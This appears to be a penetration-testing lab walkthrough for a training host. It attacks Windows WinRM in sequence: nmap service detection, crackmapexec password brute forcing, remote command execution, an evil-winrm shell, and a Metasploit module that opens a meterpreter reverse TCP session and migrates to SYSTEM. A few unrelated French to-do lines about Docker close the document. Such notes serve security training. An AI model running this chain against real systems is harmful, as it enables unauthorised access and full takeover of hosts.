# Footprint
```bash
$> nmap -sV -p 5985 demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 20:29 IST
Nmap scan report for demo.ine.local (10.2.23.34)
Host is up (0.0034s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.34 seconds
```
# Bruteforce
You can use **crackmapexec** to do a bruteforce
```bash
$> crackmapexec winrm 10.2.23.34 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
SMB         10.2.23.34      5985   SERVER           [*] Windows 10 / Server 2019 Build 17763 (name:SERVER) (domain:server)
HTTP        10.2.23.34      5985   SERVER           [*] http://10.2.23.34:5985/wsman
WINRM       10.2.23.34      5985   SERVER           [-] server\administrator:admin
...
WINRM       10.2.23.34      5985   SERVER           [-] server\administrator:elizabeth
WINRM       10.2.23.34      5985   SERVER           [-] server\administrator:hottie
WINRM       10.2.23.34      5985   SERVER           [+] server\administrator:tinkerbell (Pwn3d!)
```
# Execute a command
You can use **crackmapexec** to run a command
```bash
crackmapexec winrm 10.2.23.34 -u administrator -p tinkerbell -x "whoami"                                                                
SMB         10.2.23.34      5985   SERVER           [*] Windows 10 / Server 2019 Build 17763 (name:SERVER) (domain:server)
HTTP        10.2.23.34      5985   SERVER           [*] http://10.2.23.34:5985/wsman
WINRM       10.2.23.34      5985   SERVER           [+] server\administrator:tinkerbell (Pwn3d!)
WINRM       10.2.23.34      5985   SERVER           [+] Executed command
WINRM       10.2.23.34      5985   SERVER           server\administrator
```
# Get a shell
You can use **evil-winrm** to get a shell
```bash
$> evil-winrm -u administrator -p tinkerbell -i 10.2.23.34                                                                                 
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
# Metasploit
```bash
msf6 > use exploit/windows/winrm/winrm_script_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/winrm/winrm_script_exec) > set RHOSTS 10.2.23.34
RHOSTS => 10.2.23.34
msf6 exploit(windows/winrm/winrm_script_exec) > set FORCE_VBS true
FORCE_VBS => true
msf6 exploit(windows/winrm/winrm_script_exec) > set USERNAME administrator
USERNAME => administrator
msf6 exploit(windows/winrm/winrm_script_exec) > set PASSWORD tinkerbell
PASSWORD => tinkerbell
msf6 exploit(windows/winrm/winrm_script_exec) > run

[*] Started reverse TCP handler on 10.10.49.4:4444 
[*] Command Stager progress -  98.35% done (100252/101936 bytes)
[*] Command Stager progress - 100.00% done (101936/101936 bytes)
[*] Sending stage (176198 bytes) to 10.2.23.34
[*] Session ID 1 (10.10.49.4:4444 -> 10.2.23.34:49771) processing InitialAutoRunScript 'post/windows/manage/priv_migrate'
[*] Current session process is dvvnj.exe (2688) as: SERVER\Administrator
[*] Session is Admin but not System.
[*] Will attempt to migrate to specified System level process.
[-] Could not migrate to services.exe.
[-] Could not migrate to wininit.exe.
[*] Trying svchost.exe (892)
[+] Successfully migrated to svchost.exe (892) as: NT AUTHORITY\SYSTEM
[*] Meterpreter session 1 opened (10.10.49.4:4444 -> 10.2.23.34:49771) at 2024-11-08 20:44:06 +0530
meterpreter > 
```

-> Genere un Dockerfile 
-> tentative de build du dockerfile 
-> tentative de lancement du container 
-> Envois sur un bucket